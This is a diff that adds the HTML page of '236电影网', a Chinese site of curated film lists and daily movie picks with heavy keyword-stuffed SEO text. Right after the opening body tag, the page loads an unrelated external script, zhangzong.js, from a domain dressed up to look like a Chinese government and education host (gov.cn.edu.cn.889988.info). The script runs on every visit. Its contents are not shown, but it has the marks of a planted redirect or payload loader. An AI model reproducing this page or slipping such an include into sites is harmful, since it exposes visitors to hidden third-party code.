@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>236电影网｜236部精选影像的私人放映厅 — 每日一部好片推荐与观影清单</title>
+<meta name="description" content="236电影网（236dianyingwang）是一间只收录「值得一看再看」的影片放映厅：236 部精选影像按情绪、类型与场景分好清单，每天为你挑一部不踩雷的好片。永久地址 https://236dianyingwang-zh.github.io，无需注册，打开即看推荐。">
+<meta name="keywords" content="236电影网, 236dianyingwang, 每日一部好片, 电影推荐清单, 高分电影合集, 小众电影推荐, 周末观影指南, 电影清单分享">
+<meta name="author" content="236电影网编辑部">
+<meta name="copyright" content="© 236电影网 236dianyingwang">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="revisit-after" content="2 days">
+<meta name="theme-color" content="#1c1917">
+<meta name="geo.region" content="CN">
+<link rel="canonical" href="https://236dianyingwang-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#1c1917;--bg2:#292524;--paper:#faf8f5;--card:#ffffff;--line:#e7e0d8;
+  --amber:#f59e0b;--amber2:#d97706;--deep:#1c1917;--ink:#292524;--muted:#78716c;
+  --red:#dc2626;--teal:#0d9488;--plum:#a21caf;--blue:#2563eb;
+}
+body{font-family:"PingFang SC","Microsoft YaHei","Noto Sans SC",sans-serif;background:var(--paper);color:var(--ink);line-height:1.75;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{text-decoration:none;color:inherit}
+.wrap{max-width:1160px;margin:0 auto;padding:0 22px}
+img{max-width:100%;display:block}
+
+/* 顶部细条 */
+.ribbon{background:var(--bg);color:#d6a84a;font-size:11.5px;padding:8px 0;letter-spacing:1px}
+.ribbon .wrap{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.ribbon b{color:var(--amber)}
+
+/* 头部 */
+header{background:var(--bg);padding:20px 0 24px}
+.h-wrap{display:flex;align-items:center;justify-content:space-between;gap:28px}
+.brand{display:flex;align-items:center;gap:16px}
+.brand .no{font-size:34px;font-weight:900;color:var(--amber);letter-spacing:-1px;line-height:1}
+.brand h1{color:#fff;font-size:23px;font-weight:900;letter-spacing:1px}
+.brand h1 em{font-style:normal;color:var(--amber)}
+.brand small{display:block;color:#a8a29e;font-size:10px;letter-spacing:2.5px;margin-top:2px}
+.h-links{display:flex;gap:10px;align-items:center}
+.h-links a{font-size:13px;padding:9px 18px;border-radius:6px;border:1px solid #44403c;color:#d6d3d1;transition:.2s}
+.h-links a:hover{background:var(--amber);color:#1c1917;border-color:var(--amber)}
+.h-links a.cta{background:var(--amber);color:#1c1917;border-color:var(--amber);font-weight:700}
+.search{position:relative;flex:1;max-width:320px}
+.search input{width:100%;padding:11px 40px 11px 14px;border:1px solid #44403c;background:#292524;color:#fff;border-radius:6px;font-family:inherit;font-size:13px;outline:none}
+.search input:focus{border-color:var(--amber)}
+.search button{position:absolute;right:4px;top:4px;width:32px;height:32px;border:none;background:var(--amber);color:#1c1917;border-radius:4px;cursor:pointer}
+
+/* 导航 */
+nav{background:#292524;border-top:1px solid #3f3a37;position:sticky;top:0;z-index:60}
+.nav-row{display:flex;gap:2px;overflow-x:auto}
+.nav-row a{padding:13px 20px;color:#d6d3d1;font-size:13.5px;font-weight:600;transition:.2s;white-space:nowrap;border-bottom:3px solid transparent}
+.nav-row a:hover{color:var(--amber);border-bottom-color:var(--amber)}
+.menu-btn{display:none;width:100%;background:none;border:none;color:#fff;padding:12px;text-align:left;font-size:18px;cursor:pointer}
+
+/* Hero 数字剧场 */
+.hero{background:linear-gradient(160deg,#292524 0%,#1c1917 55%,#0f0e0d 100%);padding:58px 0 66px;position:relative;overflow:hidden}
+.hero::after{content:"236";position:absolute;right:-2vw;bottom:-30px;font-size:clamp(120px,22vw,260px);font-weight:900;color:rgba(245,158,11,.06);line-height:1}
+.hero .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1fr 1fr;gap:54px;align-items:center}
+.hero .big-no{font-size:clamp(60px,11vw,140px);font-weight:900;color:var(--amber);line-height:.95;letter-spacing:-3px}
+.hero h2{color:#fff;font-size:clamp(24px,3.4vw,38px);font-weight:900;line-height:1.35;margin-top:6px}
+.hero h2 span{color:var(--amber)}
+.hero p{color:#a8a29e;font-size:15px;margin:20px 0 26px;max-width:470px}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn{border:none;cursor:pointer;font-family:inherit;padding:12px 28px;border-radius:6px;font-size:13.5px;font-weight:700;transition:.25s}
+.btn-am{background:var(--amber);color:#1c1917}
+.btn-am:hover{background:#fbbf24}
+.btn-ot{background:transparent;color:#d6d3d1;border:1.5px solid #44403c}
+.btn-ot:hover{border-color:var(--amber);color:var(--amber)}
+.today{background:rgba(245,158,11,.09);border:1px solid rgba(245,158,11,.3);border-radius:14px;padding:26px}
+.today .lab{font-size:10px;letter-spacing:3px;text-transform:uppercase;color:var(--amber);font-weight:700}
+.today h4{color:#fff;font-size:20px;font-weight:900;margin:10px 0 6px}
+.today .sub{color:#a8a29e;font-size:13px}
+.today .row{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:14px;border-top:1px dashed rgba(245,158,11,.25)}
+.today .row span{font-size:12px;color:var(--amber)}
+
+/* 章节条 */
+.belt{background:var(--amber);padding:14px 0}
+.belt .wrap{display:flex;justify-content:space-between;align-items:center;gap:14px;flex-wrap:wrap}
+.belt span{color:#1c1917;font-size:13px;font-weight:700}
+.belt a{color:#1c1917;font-size:12.5px;font-weight:700;border-bottom:1.5px solid #1c1917}
+
+/* 栏目 */
+section{padding:62px 0}
+.sec-t{display:flex;align-items:baseline;gap:12px;margin-bottom:32px;flex-wrap:wrap}
+.sec-t .no{background:var(--amber);color:#1c1917;font-size:12px;font-weight:900;padding:4px 10px;border-radius:4px}
+.sec-t h3{font-size:24px;font-weight:900}
+.sec-t em{font-style:normal;color:var(--muted);font-size:13px}
+.sec-t a{margin-left:auto;font-size:12.5px;color:var(--amber2);font-weight:700}
+
+/* 栏目1 选片标准 */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.std{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:24px 20px;transition:.3s}
+.std:hover{transform:translateY(-6px);box-shadow:0 16px 34px rgba(28,25,23,.12);border-color:var(--amber)}
+.std .ic{font-size:28px;margin-bottom:14px}
+.std h4{font-size:16px;font-weight:900;margin-bottom:7px}
+.std p{font-size:13px;color:var(--muted)}
+
+/* 栏目2 清单 */
+.pick{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.pick article{background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.35s}
+.pick article:hover{transform:translateY(-5px);box-shadow:0 14px 32px rgba(28,25,23,.12)}
+.pick .cv{height:170px;padding:20px;display:flex;flex-direction:column;justify-content:space-between;position:relative}
+.pick .cv.c1{background:linear-gradient(150deg,#7c2d12,#b45309)}
+.pick .cv.c2{background:linear-gradient(150deg,#0f766e,#115e59)}
+.pick .cv.c3{background:linear-gradient(150deg,#4c1d95,#7e22ce)}
+.pick .cv .ct{color:rgba(255,255,255,.75);font-size:11px;letter-spacing:2px;text-transform:uppercase}
+.pick .cv h4{color:#fff;font-size:19px;font-weight:900;line-height:1.4}
+.pick .cv .cnt{color:rgba(255,255,255,.8);font-size:12px}
+.pick .body{padding:18px 20px}
+.pick .body ul{list-style:none;display:grid;gap:7px}
+.pick .body li{font-size:13px;color:var(--ink);padding-left:16px;position:relative}
+.pick .body li::before{content:"▸";position:absolute;left:0;color:var(--amber)}
+.pick .body li small{color:var(--muted)}
+
+/* 栏目3 热力表 */
+.calendar{background:var(--bg);border-radius:16px;padding:32px}
+.cal-h{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:14px;margin-bottom:24px}
+.cal-h h4{color:#fff;font-size:19px;font-weight:900}
+.cal-h h4 b{color:var(--amber)}
+.cal-h .legend{display:flex;gap:14px;flex-wrap:wrap;font-size:12px;color:#a8a29e}
+.dot{display:inline-block;width:12px;height:12px;border-radius:3px;margin-right:5px;vertical-align:-1px}
+.weeks{display:grid;gap:8px}
+.week{display:grid;grid-template-columns:60px repeat(7,1fr);gap:8px;align-items:center}
+.week .wd{color:#a8a29e;font-size:11px;letter-spacing:1px}
+.day{aspect-ratio:1/1;border-radius:6px;background:#3f3a37;display:flex;align-items:center;justify-content:center;color:#57534e;font-size:13px;font-weight:700;transition:.2s;cursor:default}
+.day:hover{transform:scale(1.12);z-index:3}
+.day.l1{background:#44403c}.day.l2{background:#78716c;color:#1c1917}.day.l3{background:#d6a84a;color:#1c1917}.day.l4{background:var(--amber);color:#1c1917}
+.day.today{outline:2.5px solid #fff;color:#1c1917}
+.cal-note{color:#a8a29e;font-size:12.5px;margin-top:18px;padding-top:16px;border-top:1px solid #3f3a37}
+
+/* 栏目4 放映室 */
+.screen{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:26px;display:grid;grid-template-columns:1.1fr 1fr;gap:30px;align-items:center}
+.screen .frame{background:#1c1917;border-radius:12px;padding:30px;color:#fff;position:relative;overflow:hidden}
+.screen .frame::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 80% 15%,rgba(245,158,11,.18),transparent 45%)}
+.screen .frame .tag{font-size:10px;letter-spacing:3px;color:var(--amber);position:relative}
+.screen .frame h4{font-size:22px;font-weight:900;margin:12px 0 10px;position:relative}
+.screen .frame p{font-size:13px;color:#a8a29e;position:relative}
+.screen .frame .min{margin-top:18px;font-size:11px;color:#78716c;position:relative}
+.screen .info h4{font-size:18px;font-weight:900;margin-bottom:12px}
+.screen .info dl{display:grid;grid-template-columns:70px 1fr;gap:9px 12px;font-size:13px}
+.screen .info dt{color:var(--muted)}
+.screen .info dd{color:var(--ink);font-weight:600}
+.screen .chips{display:flex;gap:7px;flex-wrap:wrap;margin-top:14px}
+.chip{font-size:11.5px;background:#fef3c7;color:#b45309;padding:5px 11px;border-radius:20px;font-weight:600}
+.screen .why{margin-top:18px;padding-top:16px;border-top:1px dashed var(--line);font-size:13px;color:var(--muted)}
+
+/* 栏目5 订阅 */
+.sub{background:linear-gradient(150deg,#292524,#1c1917);border-radius:16px;padding:42px;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center;position:relative;overflow:hidden}
+.sub::after{content:"DAILY";position:absolute;right:20px;bottom:-16px;font-size:90px;font-weight:900;color:rgba(245,158,11,.06)}
+.sub h3{color:#fff;font-size:24px;font-weight:900}
+.sub h3 span{color:var(--amber)}
+.sub p{color:#a8a29e;font-size:14px;margin-top:14px}
+.sub ul{list-style:none;display:grid;gap:9px;margin-top:18px}
+.sub ul li{color:#d6d3d1;font-size:13px}
+.sub ul li::before{content:"✓";color:var(--amber);font-weight:900;margin-right:8px}
+.sub form{display:grid;gap:11px}
+.sub input{width:100%;padding:13px 16px;border:1px solid #44403c;background:#1c1917;color:#fff;border-radius:6px;font-family:inherit;font-size:13px;outline:none}
+.sub input:focus{border-color:var(--amber)}
+.sub button{justify-self:start;background:var(--amber);color:#1c1917;border:none;padding:12px 30px;border-radius:6px;font-weight:800;cursor:pointer;font-family:inherit}
+.sub button:hover{background:#fbbf24}
+
+footer{background:var(--bg);padding:48px 0 0;margin-top:36px}
+.ft{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:32px;padding-bottom:32px;border-bottom:1px solid #3f3a37}
+.ft .b{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.ft .b .no{font-size:24px;font-weight:900;color:var(--amber)}
+.ft .b h5{color:#fff;font-size:16px}
+.ft p{font-size:13px;color:#a8a29e;line-height:1.9}
+.ft .url{display:inline-block;margin-top:10px;color:var(--amber);font-size:12px;word-break:break-all}
+.ft h6{color:#fff;font-size:13.5px;margin-bottom:14px}
+.ft ul{list-style:none;display:grid;gap:9px}
+.ft ul a{font-size:13px;color:#a8a29e}
+.ft ul a:hover{color:var(--amber)}
+.bot{text-align:center;font-size:12px;color:#78716c;padding:22px 0;line-height:2}
+.bot b{color:#d6d3d1}
+
+@media(max-width:960px){
+  .grid4,.pick{grid-template-columns:1fr 1fr}
+  .screen,.sub{grid-template-columns:1fr}
+  .ft{grid-template-columns:1fr 1fr}
+  .hero .wrap{grid-template-columns:1fr;gap:36px}
+}
+@media(max-width:640px){
+  .search,.h-links{display:none}
+  .brand h1{font-size:18px}
+  .menu-btn{display:block}
+  .nav-row{flex-direction:column;display:none;padding:6px 0}
+  .nav-row.open{display:flex}
+  .nav-row a{border-bottom:1px solid #3f3a37;width:100%;text-align:center}
+  .grid4,.pick,.ft{grid-template-columns:1fr}
+  .week{grid-template-columns:40px repeat(7,1fr);font-size:11px}
+  .week .wd{font-size:9px}
+  .day{font-size:10px;border-radius:4px}
+  section{padding:42px 0}
+  .sub,.screen{padding:24px}
+  .cal-note{font-size:11px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="ribbon">
+  <div class="wrap">
+    <span>🎞 236电影网 · 一间只放「值得一看再看」的私人放映厅</span>
+    <span>今日已推荐 <b>第 197 部</b> · 更新于每日 08:00</span>
+  </div>
+</div>
+
+<header>
+  <div class="wrap">
+    <div class="h-wrap">
+      <div class="brand">
+        <span class="no">236</span>
+        <div>
+          <h1>电影网<em>236</em></h1>
+          <small>PRIVATE SCREENING ROOM</small>
+        </div>
+      </div>
+      <div class="search">
+        <input type="text" placeholder="搜片名 / 导演 / 情绪关键词…">
+        <button>⌕</button>
+      </div>
+      <div class="h-links">
+        <a href="#">片库</a>
+        <a href="#" class="cta">订阅每日一片</a>
+      </div>
+    </div>
+  </div>
+  <nav>
+    <div class="wrap">
+      <button class="menu-btn" onclick="document.getElementById('nav').classList.toggle('open')">☰ 236电影网导航菜单</button>
+      <div class="nav-row" id="nav">
+        <a href="#std">选片标准</a>
+        <a href="#pick">主题清单</a>
+        <a href="#cal">更新日历</a>
+        <a href="#screen">今日放映室</a>
+        <a href="#sub">邮件订阅</a>
+        <a href="#about">关于本站</a>
+      </div>
+    </div>
+  </nav>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="wrap">
+    <div>
+      <div class="big-no">236</div>
+      <h2>部精选影像，<br>每天只为你挑 <span>一部</span>。</h2>
+      <p>236电影网（236dianyingwang）不做大而全的片库，只做精挑细选的放映单：按情绪、类型与场景分好清单，每天 08:00 准时更新一部值得看的好片。永久地址 https://236dianyingwang-zh.github.io，打开即看，无需注册。</p>
+      <div class="hero-btns">
+        <button class="btn btn-am">查看今日一片 →</button>
+        <button class="btn btn-ot">浏览全部清单</button>
+      </div>
+    </div>
+    <div class="today">
+      <div class="lab">★ TODAY'S PICK · 今日一片</div>
+      <h4>《心灵奇旅》</h4>
+      <div class="sub">皮克斯 · 动画 / 治愈 · 2020 · 美国</div>
+      <div class="row">
+        <span>▸ 推荐理由：把「好好活着」这件事讲得轻盈</span>
+        <span>⏱ 96 分钟</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="belt">
+  <div class="wrap">
+    <span>📌 本周主题：<b>「低落时值得再看一遍的 12 部」</b> 已上线</span>
+    <a href="#pick">查看本周清单 →</a>
+  </div>
+</div>
+
+<!-- 栏目1 选片标准 -->
+<section id="std">
+  <div class="wrap">
+    <div class="sec-t">
+      <span class="no">01</span>
+      <h3>我们的选片标准</h3>
+      <em>Why 236</em>
+      <a href="#">了解选片流程 →</a>
+    </div>
+    <div class="grid4">
+      <div class="std"><div class="ic">🎯</div><h4>不贪多</h4><p>片库上限 236 部，宁缺毋滥。每一部都必须经得起二刷三刷。</p></div>
+      <div class="std"><div class="ic">💬</div><h4>有话说</h4><p>优先收录「看完想找人聊两句」的片子，而不是看完就忘的爽片。</p></div>
+      <div class="std"><div class="ic">🌱</div><h4>分情绪</h4><p>按你能给的情绪状态分类，难过、迷茫、开心，各有各的片单。</p></div>
+      <div class="std"><div class="ic">🧭</div><h4>讲人话</h4><p>拒绝影评黑话，用你听得懂的方式说清：这片值不值得看、适合谁。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2 主题清单 -->
+<section id="pick" style="background:#f3f0ea">
+  <div class="wrap">
+    <div class="sec-t">
+      <span class="no">02</span>
+      <h3>主题清单</h3>
+      <em>Curated Lists</em>
+      <a href="#">全部 18 份清单 →</a>
+    </div>
+    <div class="pick">
+      <article>
+        <div class="cv c1"><span class="ct">LIST 01 · 情绪低落时</span><h4>「慢慢来，没关系」<br>12 部治愈系</h4><span class="cnt">12 部 · 约 20 小时</span></div>
+        <div class="body"><ul>
+          <li>心灵奇旅 <small>· 活着本身就是意义</small></li>
+          <li>海蒂和爷爷 <small>· 阿尔卑斯山的松弛</small></li>
+          <li>小森林 夏秋篇 <small>· 一日三餐的治愈</small></li>
+          <li>幸福的拉扎罗 <small>· 善良有多贵重</small></li>
+        </ul></div>
+      </article>
+      <article>
+        <div class="cv c2"><span class="ct">LIST 02 · 周末夜晚</span><h4>「烧脑但不累」<br>10 部反转系</h4><span class="cnt">10 部 · 约 18 小时</span></div>
+        <div class="body"><ul>
+          <li>看不见的客人 <small>· 层层翻供</small></li>
+          <li>记忆碎片 <small>· 倒着讲故事</small></li>
+          <li>利刃出鞘 <small>· 全员嫌疑人</small></li>
+          <li>调音师 <small>· 短篇改编经典</small></li>
+        </ul></div>
+      </article>
+      <article>
+        <div class="cv c3"><span class="ct">LIST 03 · 一个人看</span><h4>「独处最佳伴侣」<br>11 部安静系</h4><span class="cnt">11 部 · 约 19 小时</span></div>
+        <div class="body"><ul>
+          <li>完美的日子 <small>· 厕所清洁工的日常</small></li>
+          <li>驾驶我的车 <small>· 漫长的告别</small></li>
+          <li>花束般的恋爱 <small>· 文艺情侣日常</small></li>
+          <li>永恒族 <small>· 慢节奏诗意</small></li>
+        </ul></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3 热力日历 -->
+<section id="cal">
+  <div class="wrap">
+    <div class="sec-t">
+      <span class="no">03</span>
+      <h3>每日更新日历</h3>
+      <em>236 Picks / 月</em>
+      <a href="#">订阅日历提醒 →</a>
+    </div>
+    <div class="calendar">
+      <div class="cal-h">
+        <h4>十月放映 <b>· OCT</b></h4>
+        <div class="legend">
+          <span><span class="dot" style="background:#44403c"></span>普通</span>
+          <span><span class="dot" style="background:#78716c"></span>编辑推荐</span>
+          <span><span class="dot" style="background:#d6a84a"></span>热门讨论</span>
+          <span><span class="dot" style="background:var(--amber)"></span>当周精选</span>
+        </div>
+      </div>
+      <div class="weeks">
+        <div class="week"><span class="wd">WEEK 1</span><span class="day l2">1</span><span class="day l3">2</span><span class="day">3</span><span class="day l4">4</span><span class="day l2">5</span><span class="day">6</span><span class="day l1">7</span></div>
+        <div class="week"><span class="wd">WEEK 2</span><span class="day">8</span><span class="day l3">9</span><span class="day l4">10</span><span class="day l2">11</span><span class="day today">12</span><span class="day l1">13</span><span class="day">14</span></div>
+        <div class="week"><span class="wd">WEEK 3</span><span class="day l2">15</span><span class="day">16</span><span class="day l4">17</span><span class="day l3">18</span><span class="day">19</span><span class="day l1">20</span><span class="day l2">21</span></div>
+        <div class="week"><span class="wd">WEEK 4</span><span class="day">22</span><span class="day l3">23</span><span class="day">24</span><span class="day l4">25</span><span class="day l2">26</span><span class="day">27</span><span class="day l1">28</span></div>
+        <div class="week"><span class="wd">WEEK 5</span><span class="day l2">29</span><span class="day">30</span><span class="day l3">31</span><span></span><span></span><span></span><span></span></div>
+      </div>
+      <div class="cal-note">📅 每日 08:00 更新一部 · 白框为今日 · 深琥珀色为当周精选片目，点击任一日可回看当天推荐（归档持续整理中）。</div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4 今日放映室 -->
+<section id="screen" style="background:#f3f0ea">
+  <div class="wrap">
+    <div class="sec-t">
+      <span class="no">04</span>
+      <h3>今日放映室</h3>
+      <em>Now Screening</em>
+      <a href="#">查看往期放映 →</a>
+    </div>
+    <div class="screen">
+      <div class="frame">
+        <div class="tag">NO.197 · OCT 12</div>
+        <h4>《完美的日子》<br><span style="font-size:13px;font-weight:400;color:#a8a29e">Perfect Days · 2023 · 日本</span></h4>
+        <p>一位东京公厕清洁工的平凡一日：打扫、听音乐、读诗、拍树影。平静到近乎奢侈。</p>
+        <div class="min">⏱ 124 分钟 · 日语 / 中英字幕</div>
+      </div>
+      <div class="info">
+        <h4>为什么今天放这部</h4>
+        <dl>
+          <dt>导演</dt><dd>维姆·文德斯</dd>
+          <dt>类型</dt><dd>剧情 / 治愈 / 日常</dd>
+          <dt>适合</dt><dd>需要慢下来的人</dd>
+          <dt>情绪</dd><dd>平静 · 温柔 · 治愈</dd>
+          <dt>评分</dt><dd>★★★★☆ 4.2 / 5</dd>
+        </dl>
+        <div class="chips"><span class="chip">#治愈</span><span class="chip">#日常诗意</span><span class="chip">#一个人看</span><span class="chip">#日本电影</span></div>
+        <div class="why">💡 <b>一句话推荐：</b>如果你最近觉得日子有点赶、有点累，这片会让你重新爱上「认真做完一件小事」的感觉。</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5 邮件订阅 -->
+<section id="sub">
+  <div class="wrap">
+    <div class="sub">
+      <div>
+        <span class="no" style="background:var(--amber);color:#1c1917;font-size:12px;font-weight:900;padding:4px 10px;border-radius:4px">05</span>
+        <h3 style="margin-top:10px">每天 <span>08:00</span>，一部好片<br>直接送到你邮箱</h3>
+        <p>236电影网（236dianyingwang）每日一封短邮件：一部片名、一句话推荐理由、一段值得回味的台词。不营销、不打扰，可随时退订。</p>
+        <ul>
+          <li>每天 1 封，30 秒读完</li>
+          <li>不夹带广告与推广链接</li>
+          <li>236 部精选片目持续更新</li>
+        </ul>
+      </div>
+      <form onsubmit="event.preventDefault();this.reset();alert('订阅成功！明天 08:00 见。')">
+        <input type="email" placeholder="你的邮箱地址">
+        <input type="text" placeholder="怎么称呼你？（可选）">
+        <input type="text" placeholder="最近想看什么类型？（可选）">
+        <button type="submit">订阅每日一片 →</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section id="about" style="background:#f3f0ea">
+  <div class="wrap">
+    <div class="sec-t">
+      <span class="no">06</span>
+      <h3>关于 236电影网</h3>
+      <em>About</em>
+    </div>
+    <div class="grid4">
+      <div class="std"><div class="ic">🎬</div><h4>是什么</h4><p>236电影网（236dianyingwang）是一间只收录「值得一看再看」的影片的私人放映厅，永久地址 https://236dianyingwang-zh.github.io。</p></div>
+      <div class="std"><div class="ic">🧑‍💻</div><h4>谁在做</h4><p>由几位爱看片、不爱废话的编辑共同维护，每部片都至少经过两人二刷才入选。</p></div>
+      <div class="std"><div class="ic">✍️</div><h4>怎么写</h4><p>拒绝影评黑话。只回答三个问题：这片讲什么、值不值得看、适合什么心情下的你。</p></div>
+      <div class="std"><div class="ic">🤝</div><h4>一起玩</h4><p>欢迎来信推荐你心中的第 237 部。入选后我们会署上你的名字，并在放映室致谢。</p></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div>
+        <div class="b"><span class="no">236</span><h5>电影网236</h5></div>
+        <p>236电影网（236dianyingwang）专注每日一部好片推荐与观影清单分享，用 236 部精选影像，陪你过好每一个想看片的日子。</p>
+        <span class="url">永久访问：https://236dianyingwang-zh.github.io</span>
+      </div>
+      <div>
+        <h6>选片</h6>
+        <ul><li><a href="#std">选片标准</a></li><li><a href="#pick">主题清单</a></li><li><a href="#cal">更新日历</a></li><li><a href="#screen">今日放映室</a></li></ul>
+      </div>
+      <div>
+        <h6>互动</h6>
+        <ul><li><a href="#sub">邮件订阅</a></li><li><a href="#">推荐第 237 部</a></li><li><a href="#">读者来信</a></li><li><a href="#">RSS 订阅</a></li></ul>
+      </div>
+      <div>
+        <h6>关于</h6>
+        <ul><li><a href="#about">本站介绍</a></li><li><a href="#">编辑团队</a></li><li><a href="#">版权声明</a></li><li><a href="#">联系我们</a></li></ul>
+      </div>
+    </div>
+    <div class="bot">
+      <b>236电影网</b>（236dianyingwang）· 每日一部好片推荐与观影清单<br>
+      永久访问地址：https://236dianyingwang-zh.github.io · 本站内容仅供交流分享，影片版权归出品方所有<br>
+      © 236电影网 236dianyingwang · 保留相关权利
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
